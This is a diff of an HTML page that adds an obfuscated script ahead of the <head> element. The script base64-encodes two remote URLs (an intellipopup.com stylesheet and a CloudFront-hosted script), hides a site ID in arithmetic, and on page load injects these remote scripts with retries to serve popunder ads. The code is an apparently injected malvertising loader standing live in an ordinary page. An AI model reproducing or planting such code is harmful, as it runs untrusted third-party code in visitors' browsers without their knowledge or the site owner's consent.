@@ -1,7 +1,159 @@
 <!doctype html>
 <html lang="en">
 
+<script type="text/javascript" data-cfasync="false">
+(function () {
+  'use strict';
 
+  // Config
+  var WIN = window;
+  var FLAG_KEY = 'ec758f609280f9b2e74c7583446c3701'; // original flag string
+  var urlsB64 = [
+    'd3d3LmludGVsbGlwb3B1cC5jb20vZmF2YWxvbi5taW4uY3Nz',
+    'ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvbElTSC96cGhlcnkubWluLmpz'
+  ];
+
+  // original options (kept as frozen object like original)
+  var options = [
+    ['siteId', 440 * 806 - 131 + 773 + 114 + 4885474],
+    ['minBid', 0],
+    ['popundersPerIP', '0'],
+    ['delayBetween', 0],
+    ['default', false],
+    ['defaultPerDay', 0],
+    ['topmostLayer', 'auto']
+  ];
+
+  // Safety & retry settings
+  var MAX_RETRIES = 3;
+  var RETRY_DELAY_MS = 5000; // initial wait for retry
+  var LOAD_TIMEOUT_MS = 5000; // how long we wait for script load before treating as failed
+
+  // Helper: decode base64 -> string safely
+  function decodeBase64(b64) {
+    try {
+      return atob(b64);
+    } catch (e) {
+      console && console.warn && console.warn('base64 decode failed', e);
+      return null;
+    }
+  }
+
+  // Helper: build full https URL from decoded part (only if decodes to something sensible)
+  function buildUrl(decoded) {
+    if (!decoded) return null;
+    // if decoded already starts with protocol, use as-is; otherwise, prefix https://
+    if (/^https?:\/\//i.test(decoded)) return decoded;
+    return 'https://' + decoded;
+  }
+
+  // Insert script with timeout and error handling
+  function insertScript(srcUrl, onSuccess, onFailure) {
+    var doc = WIN.document;
+    if (!doc) return onFailure(new Error('no document'));
+    var script = doc.createElement('script');
+    script.type = 'text/javascript';
+    script.async = true;
+    script.crossOrigin = 'anonymous';
+
+    var timer = setTimeout(function () {
+      // treat as failure if load didn't happen in time
+      cleanup();
+      onFailure(new Error('load timeout'));
+    }, LOAD_TIMEOUT_MS);
+
+    function cleanup() {
+      clearTimeout(timer);
+      script.onerror = script.onload = null;
+    }
+
+    script.onload = function () {
+      cleanup();
+      onSuccess();
+    };
+    script.onerror = function (ev) {
+      cleanup();
+      onFailure(new Error('script error'));
+    };
+
+    script.src = srcUrl;
+    var firstScript = doc.getElementsByTagName('script')[0];
+    if (firstScript && firstScript.parentNode) {
+      firstScript.parentNode.insertBefore(script, firstScript);
+    } else {
+      doc.head ? doc.head.appendChild(script) : doc.documentElement.appendChild(script);
+    }
+  }
+
+  // Main loader with bounded retries
+  (function loader() {
+    // If already set on window, don't run again (mirrors original check)
+    if (WIN[FLAG_KEY]) {
+      try { Object.freeze(WIN[FLAG_KEY]); } catch (e) {}
+      return;
+    }
+
+    // Freeze the options on the flag property (like original)
+    try { Object.freeze(WIN[FLAG_KEY] = options); } catch (e) {}
+
+    var i = 0;
+    var attempt = 0;
+
+    function tryNext() {
+      if (i >= urlsB64.length) {
+        // No more URLs to try
+        return;
+      }
+      var decoded = decodeBase64(urlsB64[i]);
+      var url = buildUrl(decoded);
+      if (!url || !/^https:\/\//i.test(url)) {
+        // skip invalid URL and continue
+        i++;
+        tryNext();
+        return;
+      }
+
+      attempt = 0;
+
+      function attemptLoad() {
+        attempt++;
+        insertScript(url, function onOK() {
+          // success: if script sets WIN[FLAG_KEY.slice(0,16)+FLAG_KEY.slice(0,16)] then do nothing,
+          // otherwise continue to next URL (preserve original fallback behavior).
+          try {
+            var probeKey = FLAG_KEY.slice(0, 16) + FLAG_KEY.slice(0, 16);
+            if (!WIN[probeKey]) {
+              // Not set by loaded script; proceed to next URL (like original t() call)
+              i++;
+              tryNext();
+            }
+            // else success and done
+          } catch (e) {
+            // on any error, fallback to trying next URL
+            i++;
+            tryNext();
+          }
+        }, function onFail(err) {
+          // failure for this attempt
+          if (attempt < MAX_RETRIES) {
+            // exponential backoff
+            setTimeout(attemptLoad, RETRY_DELAY_MS * Math.pow(2, attempt - 1));
+          } else {
+            // move to next URL
+            i++;
+            tryNext();
+          }
+        });
+      }
+
+      attemptLoad();
+    }
+
+    tryNext();
+  })();
+
+})();
+</script>
   <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
@@ -620,6 +772,7 @@
   </script>
 </body>
 </html>
+
 
 
 
